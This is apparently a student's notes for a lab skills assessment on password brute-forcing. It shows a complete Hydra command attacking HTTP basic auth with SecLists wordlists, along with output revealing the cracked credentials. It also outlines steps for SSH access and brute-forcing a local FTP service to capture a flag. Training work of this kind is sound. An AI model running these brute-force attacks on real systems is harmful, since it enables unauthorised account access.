Q1. What is the password for the basic auth login?

```
 hydra -L /home/satoru/SecLists/Usernames/top-usernames-shortlist.txt \
-P /home/satoru/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
http-get://154.57.164.67:32670/
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-18 12:38:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-get://154.57.164.67:32670/
[32670][http-get] host: 154.57.164.67   login: admin   password: Admin123

```

Q2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

![](Attachments/Pasted%20image%2020260918123925.png)



## Part 2

Q1. What is the username of the ftp user you find via brute-forcing?

```step 1 

scan the ip using nmap and find the ssh try the previous username and password list.

step 2 

login  with the ssh

step 3 

use the tool and create a list of user name and use the password list to bruteforce the local:ftp 

step 4 

login and grab the flag.




